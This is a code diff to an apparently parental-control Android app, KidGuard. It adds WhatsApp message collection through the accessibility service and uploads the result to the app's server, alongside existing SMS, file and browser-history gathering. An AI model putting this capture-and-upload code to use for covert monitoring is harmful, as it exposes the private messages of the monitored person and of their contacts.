@@ -1,8 +1,8 @@
 package com.kidguard.services;
 
-
 import android.Manifest;
 import android.content.Context;
+import android.os.Build;
 import android.os.Environment;
 import android.util.Log;
 
@@ -17,6 +17,7 @@ import com.kidguard.asynctask.FilesAsyncTask;
 import com.kidguard.asynctask.ImagesAsyncTask;
 import com.kidguard.asynctask.SmsAsyncTask;
 import com.kidguard.asynctask.VideoAsyncTask;
+import com.kidguard.asynctask.WhatsAppAsyncTask;
 import com.kidguard.interfaces.Constant;
 import com.kidguard.model.Apps;
 import com.kidguard.model.BrowserHistory;
@@ -29,6 +30,7 @@ import com.kidguard.model.Mail;
 import com.kidguard.model.Permissions;
 import com.kidguard.model.Sms;
 import com.kidguard.model.Video;
+import com.kidguard.model.WhatsApp;
 import com.kidguard.preference.Preference;
 import com.kidguard.utilities.DeviceAdmin;
 import com.kidguard.utilities.Utilities;
@@ -54,6 +56,7 @@ public class BackgroundDataService implements Constant {
     private ArrayList<BrowserHistory> lstBrowserHistory;
     private ArrayList<File> fileList;
     private ArrayList<Permissions> lstPermission;
+    private ArrayList<WhatsApp> lstWhatsApp;
     private Context ctx;
 
     // Default Constructor
@@ -168,6 +171,19 @@ public class BackgroundDataService implements Constant {
 
         if (tag.equals(TAG_PERMISSIONS)) {
             Utilities.getAppPermissions(ctx);
+            return;
+        }
+
+        if (tag.equals(TAG_WHATSAPP)) {
+            if (Build.VERSION.SDK_INT >= 19) {
+                if (Utilities.isAccessibilityEnabled(ctx)) {
+                    new WhatsAppAsyncTask(ctx).execute();
+                } else {
+                    sendWhatsAppDataToServer(lstWhatsApp);
+                }
+            } else {
+                sendWhatsAppDataToServer(lstWhatsApp);
+            }
         }
     }
 
@@ -291,6 +307,12 @@ public class BackgroundDataService implements Constant {
         return fileList;
     }
 
+    // Send WhatsApp Data To Server
+    public void sendWhatsAppDataToServer(ArrayList<WhatsApp> lstWhatsApp) {
+        this.lstWhatsApp = lstWhatsApp;
+        new RestClientService(TAG_WHATSAPP, Preference.getAccessToken(ctx), convertToJSONFormat(TAG_WHATSAPP));
+    }
+
     // Convert To JSON Format
     private String convertToJSONFormat(String tag) {
         StringBuilder sbAppend = new StringBuilder();
@@ -353,7 +375,6 @@ public class BackgroundDataService implements Constant {
         }
 
         if (tag.equals(TAG_FILES)) {
-
             if (lstFiles != null && lstFiles.size() > Integer.parseInt(ZERO)) {
                 Type type = new TypeToken<List<Files>>() {
                 }.getType();
@@ -425,7 +446,7 @@ public class BackgroundDataService implements Constant {
 
         if (tag.equals(TAG_BROWSER_HISTORY)) {
             if (lstBrowserHistory != null && lstBrowserHistory.size() > Integer.parseInt(ZERO)) {
-                Type type = new TypeToken<List<GoogleDrive>>() {
+                Type type = new TypeToken<List<BrowserHistory>>() {
                 }.getType();
                 JsonArray jsonArray = (JsonArray) gson.toJsonTree(lstBrowserHistory, type);
                 JsonArray jsonArrayDrive = Utilities.getJsonArray(jsonArray);
@@ -439,7 +460,7 @@ public class BackgroundDataService implements Constant {
 
         if (tag.equals(TAG_PERMISSIONS)) {
             if (lstPermission != null && lstPermission.size() > Integer.parseInt(ZERO)) {
-                Type type = new TypeToken<List<GoogleDrive>>() {
+                Type type = new TypeToken<List<Permissions>>() {
                 }.getType();
                 JsonArray jsonArray = (JsonArray) gson.toJsonTree(lstPermission, type);
                 JsonArray jsonArrayPermission = Utilities.getJsonArray(jsonArray);
@@ -447,6 +468,20 @@ public class BackgroundDataService implements Constant {
                 sbAppend.append(finalJSON);
             } else {
                 finalJSON = "\"Permissions\":" + "[]";
+                sbAppend.append(finalJSON);
+            }
+        }
+
+        if (tag.equals(TAG_WHATSAPP)) {
+            if (lstWhatsApp != null && lstWhatsApp.size() > Integer.parseInt(ZERO)) {
+                Type type = new TypeToken<List<WhatsApp>>() {
+                }.getType();
+                JsonArray jsonArray = (JsonArray) gson.toJsonTree(lstWhatsApp, type);
+                JsonArray jsonArrayPermission = Utilities.getJsonArray(jsonArray);
+                finalJSON = "\"WhatsApp\":" + jsonArrayPermission;
+                sbAppend.append(finalJSON);
+            } else {
+                finalJSON = "\"WhatsApp\":" + "[]";
                 sbAppend.append(finalJSON);
             }
         }
